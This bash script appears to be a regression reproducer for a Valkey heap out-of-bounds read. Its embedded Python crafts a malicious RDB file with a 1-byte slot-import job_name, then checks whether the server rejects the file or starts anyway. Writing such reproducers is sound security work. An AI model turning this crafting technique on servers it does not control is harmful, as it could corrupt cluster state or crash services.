#!/bin/bash
# Reproducer for: missing length check on RDB_OPCODE_SLOT_IMPORT job_name.
#
# clusterRDBLoadSlotImport() reads a variable-length job_name string from the
# RDB and hands it to createSlotImportJob(), which always memcpy()s
# CLUSTER_NAMELEN (40) bytes into a fixed-size buffer. The fix rejects any
# job_name whose length isn't exactly CLUSTER_NAMELEN before that memcpy.
# Without the fix, a crafted RDB with a 1-byte job_name makes the loader
# memcpy 40 bytes out of a 1-byte heap allocation (heap OOB read), and the
# server proceeds to start up with cluster state built from garbage instead
# of rejecting the file.
#
# This script crafts such an RDB, starts a cluster-enabled server pointing at
# it, and reports whether the server rejected the file (fixed behaviour) or
# came up anyway (buggy behaviour).
set -u

: "${VALKEY_SERVER:?}"
: "${VALKEY_CLI:?}"
: "${PORT:?}"

DIR="$PWD"
GEN_DIR="$DIR/gen"
VICTIM_DIR="$DIR/victim"
mkdir -p "$GEN_DIR" "$VICTIM_DIR"

cleanup() {
    "$VALKEY_CLI" -p "$PORT" shutdown nosave >/dev/null 2>&1
}
trap cleanup EXIT

wait_for_ping() {
    local tries=50
    while [ "$tries" -gt 0 ]; do
        if "$VALKEY_CLI" -p "$PORT" ping 2>/dev/null | grep -q PONG; then
            return 0
        fi
        sleep 0.2
        tries=$((tries - 1))
    done
    return 1
}

# --- Step 1: generate a plain empty RDB to use as a base. -------------------
# Redirect the server's own stdout/stderr to a file: on RDB load failure the
# server re-execs itself as a check-rdb style diagnostic tool that prints a
# raw dump (including the RDB's creation timestamp) straight to stdout/stderr
# rather than the logfile; that output is not deterministic, so it must never
# reach this script's own stdout/stderr.
"$VALKEY_SERVER" --port "$PORT" --save "" --appendonly no \
    --dir "$GEN_DIR" --dbfilename empty.rdb --logfile gen.log \
    >"$GEN_DIR/gen.out" 2>&1 &

if ! wait_for_ping; then
    echo "GEN_SERVER_DID_NOT_START"
    exit 1
fi
"$VALKEY_CLI" -p "$PORT" save >/dev/null
"$VALKEY_CLI" -p "$PORT" shutdown nosave >/dev/null 2>&1
sleep 0.3

if [ ! -f "$GEN_DIR/empty.rdb" ]; then
    echo "EMPTY_RDB_NOT_CREATED"
    exit 1
fi

# --- Step 2: craft a malicious RDB with a 1-byte slot-import job_name. ------
python3 -I - "$GEN_DIR/empty.rdb" "$VICTIM_DIR/dump.rdb" <<'PY'
import sys

src, dst = sys.argv[1], sys.argv[2]
with open(src, "rb") as f:
    data = f.read()

# A plain empty RDB ends with: EOF opcode (0xFF) + 8-byte CRC64 checksum.
assert data[-9] == 0xFF, "expected RDB EOF opcode before checksum"
prefix = data[:-9]

# RDB_OPCODE_SLOT_IMPORT (0xF3=243) record with a 1-byte job_name "A",
# followed by 1 slot range [0,0], then EOF + zeroed (disabled) checksum.
record = bytes([
    0xF3,                   # RDB_OPCODE_SLOT_IMPORT
    0x01, 0x41,             # job_name: length=1, 'A'
    0x01,                   # num_slot_ranges = 1
    0x00, 0x00,             # start_slot=0, end_slot=0
    0xFF,                   # EOF opcode
]) + b"\x00" * 8            # checksum disabled

with open(dst, "wb") as f:
    f.write(prefix + record)
PY

if [ ! -f "$VICTIM_DIR/dump.rdb" ]; then
    echo "VICTIM_RDB_NOT_CREATED"
    exit 1
fi

# --- Step 3: start a cluster-enabled server against the crafted RDB. -------
"$VALKEY_SERVER" --port "$PORT" --save "" --appendonly no \
    --cluster-enabled yes --cluster-config-file nodes.conf \
    --dir "$VICTIM_DIR" --dbfilename dump.rdb --logfile victim.log \
    >"$VICTIM_DIR/victim.out" 2>&1 &

# Give the server a chance to either reject the RDB and exit, or come up.
tries=50
result=""
while [ "$tries" -gt 0 ]; do
    if "$VALKEY_CLI" -p "$PORT" ping 2>/dev/null | grep -q PONG; then
        result="ACCEPTED"
        break
    fi
    if grep -q "Invalid slot import job name" "$VICTIM_DIR/victim.log" 2>/dev/null; then
        result="REJECTED"
        break
    fi
    sleep 0.2
    tries=$((tries - 1))
done

if [ -z "$result" ]; then
    if grep -q "Invalid slot import job name" "$VICTIM_DIR/victim.log" 2>/dev/null; then
        result="REJECTED"
    elif grep -qE "ASSERTION FAILED|Segmentation Fault|AddressSanitizer|heap-buffer-overflow" "$VICTIM_DIR/victim.log" 2>/dev/null; then
        result="CRASHED"
    else
        result="UNRESPONSIVE"
    fi
fi

echo "RESULT=$result"

if [ "$result" = "ACCEPTED" ]; then
    # The server should not have come up at all; show that it's serving with
    # a cluster state built from the corrupted job to make the misbehaviour
    # concrete rather than just "it started".
    "$VALKEY_CLI" -p "$PORT" cluster info | grep -i state
fi
